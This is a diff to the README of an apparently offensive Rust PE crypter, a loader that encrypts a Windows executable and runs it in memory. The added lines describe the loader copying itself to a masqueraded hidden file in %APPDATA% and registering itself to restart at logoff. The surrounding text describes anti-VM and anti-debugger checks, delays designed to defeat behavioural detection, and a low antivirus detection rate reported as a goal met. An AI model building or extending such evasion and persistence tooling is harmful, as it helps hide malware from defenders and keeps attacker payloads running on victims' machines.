@@ -23,6 +23,9 @@ A Rust-based PE crypter that encrypts a Windows x64 executable, embeds it into a
 - **zstd compression** of the ciphertext before embedding — keeps the stub binary smaller than the raw target.
 - **Compile-time embedding** — the encrypted payload, padding, and configuration constants are compiled into the stub with `include_bytes!` / a generated Rust file. The final `obfuscated.exe` is fully self-contained and has no runtime file dependencies.
 - **In-memory execution** — the stub decrypts the target and maps it into its own process via `maple-rs`. No temporary file is written to disk.
+- **User-level persistence** — on first run, the stub copies itself to `%APPDATA%\Microsoft\Windows\Local Permission Handler.exe` (a masqueraded name that blends in with legitimate Windows files), sets the hidden and system attributes via `attrib +h +s`, launches the copy, and exits. The copy detects that it is already running from the target path and skips the copy step, so the stub never duplicates itself in a loop.
+- **Restart-on-shutdown persistence** — once running from the persistent location, the stub uses the `phantom_persist_rs` crate to call `RegisterApplicationRestart` (registry-free and ETW-friendly) and runs a hidden message-loop thread that intercepts `WM_QUERYENDSESSION`, forcing a restart of the process when the user logs off or shuts down.
+- **Graceful fallback** — if persistence installation fails (no `APPDATA`, permissions, etc.), the stub logs the failure in verbose mode and runs the payload normally instead of aborting.
 - **Configurable execution delay** — the stub can wait before running the target. The delay is filled with real CPU/memory work (`busywork`) instead of a static `sleep`, to break the "idle then act" behavioral signature.
 - **Randomized detection-response delay** — when a VM or debugger is detected, the stub performs 60–120 seconds of benign work before exiting, instead of quitting immediately.
 - **Analysis environment detection** — uses the `antilysis` crate, which performs a single combined check covering:
@@ -58,6 +61,8 @@ The generated binary was scanned on VirusTotal: **3 out of 68 security vendors**
   may fail to start. For such targets, set the DLL search path (`SetDllDirectoryW`) or accept that in-memory loading is not appropriate.
 - **The AES key lives in the generated stub source.** It is embedded into the stub binary and can be recovered by a determined reverse engineer. The encryption protects against static inspection, not against a targeted analysis of the stub.
 - **Obfuscation is not applied by default.** The stub is compiled with plain `cargo build --release`. LLVM-pass obfuscation (e.g. `ollvm-rust`, Amice) can be added to `build_stub`, but it is not wired in yet.
+- **Persistence is user-scoped, not system-wide.** The payload is copied to the current user's `%APPDATA%` and registered with `RegisterApplicationRestart`, so it survives logoff/shutdown for that user only. It does not survive a reboot if the process is force-killed, and it does not install a service, scheduled task, or `Run` registry key.
+- **Persistence relies on `phantom_persist_rs`.** The crate depends on undocumented/less-common Windows restart behavior and may be blocked or ignored by some Windows configurations or security products.
 - **Anti-debug and anti-VM checks are heuristics.** They can produce false positives (legitimate VMs, security software) and false negatives (hardened analysis environments). They are a first layer of defense, not a guarantee.
 
 
@@ -73,7 +78,8 @@ evasion/
 │ └── Cargo.toml
 └── stub/ # the loader — compiled fresh for every target
 ├── src/
-│ ├── main.rs # anti-analysis, decrypt, execute
+│ ├── main.rs # persistence bootstrap, anti-analysis, decrypt, execute
+│ ├── persistence.rs # self-copy, hidden attributes, Phantom Persistence registration
 │ ├── logger.rs # colored log helpers
 │ └── generated.rs # overwritten by the crypter before every build
 ├── build.rs # creates placeholder payload/padding if missing
@@ -93,11 +99,15 @@ evasion/
 
 ### Runtime flow (inside the generated stub)
 
-1. Optionally run `busywork` if a analysis is detected, then exit.
+1. Check whether the process is running from the persistence path (`%APPDATA%\Microsoft\Windows\Local Permission Handler.exe`).
+   - **First run (not the copy):** copy the running executable there, apply `+h +s` attributes, spawn the copy, and exit.
+   - **Running from the copy:** register `RegisterApplicationRestart` and start the hidden `WM_QUERYENDSESSION` message-loop thread via `phantom_persist_rs`, then continue.
+   - **Install failure:** fall through and run the payload normally without persistence.
 2. Optionally wait `DELAY_SECS`, filled with `busywork`.
-3. Decompress `payload.enc`.
-4. Decrypt the ciphertext with `KEY` / `NONCE`.
-5. Map the decrypted PE into the current process with `maple-rs` and jump to its entry point.
+3. Optionally run `busywork` if an analysis environment is detected, then exit.
+4. Decompress `payload.enc`.
+5. Decrypt the ciphertext with `KEY` / `NONCE`.
+6. Map the decrypted PE into the current process with `maple-rs` and jump to its entry point.
 
 ## Requirements
 
